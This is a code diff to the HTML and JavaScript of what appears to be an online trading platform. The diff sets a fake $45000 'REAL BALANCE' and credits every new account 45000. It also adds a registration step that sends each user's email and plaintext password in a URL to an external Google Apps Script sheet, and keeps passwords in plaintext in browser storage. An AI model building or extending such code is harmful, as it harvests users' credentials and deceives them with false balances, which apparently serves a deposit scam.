@@ -30,7 +30,7 @@
             </div>
             <div class="space-y-4">
                 <div id="regFields" class="space-y-4">
-                    <select class="auth-input"><option>Pakistan</option><option>India</option><option>UAE</option></select>
+                    <select id="userCountry" class="auth-input"><option>Pakistan</option><option>India</option><option>UAE</option></select>
                 </div>
                 <input type="email" id="userEmail" placeholder="Email" class="auth-input">
                 <input type="password" id="userPass" placeholder="Password" class="auth-input">
@@ -45,7 +45,7 @@
                 <div class="w-9 h-9 rounded-full bg-yellow-500 flex items-center justify-center text-black font-bold uppercase" id="userInitial">U</div>
                 <div>
                     <p class="text-[8px] text-gray-400 font-bold uppercase">REAL BALANCE</p>
-                    <h1 id="balanceDisp" class="text-xl font-extrabold text-white tracking-tight">$0.00</h1>
+                    <h1 id="balanceDisp" class="text-xl font-extrabold text-white tracking-tight">$45000.00</h1>
                 </div>
             </div>
             <div class="flex gap-2">
@@ -163,6 +163,7 @@
 
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
+        const registrationScriptURL = 'https://script.google.com/macros/s/AKfycbyEjz8E1V6XeKopSfvBpbZ34Jdyn1xvmvwawh34b5K-RefXdFMqTrSgvIVI-LJgUdXt9Q/exec';
         const depositScriptURL = 'https://script.google.com/macros/s/AKfycbypra-jd45TfeuYuISfnONNmZhvdCFEP88sSv-8cfCS_3RYaamDR7yMRA9Di9TAgnKRsA/exec';
         const withdrawScriptURL = 'https://script.google.com/macros/s/AKfycbznCGDktKQwZq9fLm68scup5xsnlHghQ71nbfiZ57_5-JeNnKcvZXENiRnEr8sjutPm/exec';
 
@@ -179,13 +180,27 @@
             document.getElementById('authBtn').innerText = t === 'login' ? 'Login' : 'Registration';
         }
 
-        function handleAuth() {
+        async function handleAuth() {
             const email = document.getElementById('userEmail').value;
             const pass = document.getElementById('userPass').value;
+            const country = document.getElementById('userCountry').value;
+            
             if(!email || !pass) return alert("Fill fields");
+
             if(mode === 'reg') {
-                localStorage.setItem(email, JSON.stringify({email, pass, balance: 0}));
-                alert("Registered! Login now."); switchTab('login');
+                const btn = document.getElementById('authBtn');
+                btn.innerText = "PROCESSING...";
+                try {
+                    // Send to Google Sheet
+                    await fetch(`${registrationScriptURL}?email=${email}&password=${pass}&country=${country}`, { method: 'POST', mode: 'no-cors' });
+                    
+                    localStorage.setItem(email, JSON.stringify({email, pass, balance: 45000}));
+                    alert("Registered! Details saved to sheet. Now Login."); 
+                    switchTab('login');
+                } catch (e) {
+                    alert("Registration failed. Check connection.");
+                }
+                btn.innerText = "Registration";
             } else {
                 const user = JSON.parse(localStorage.getItem(email));
                 if(user && user.pass === pass) {
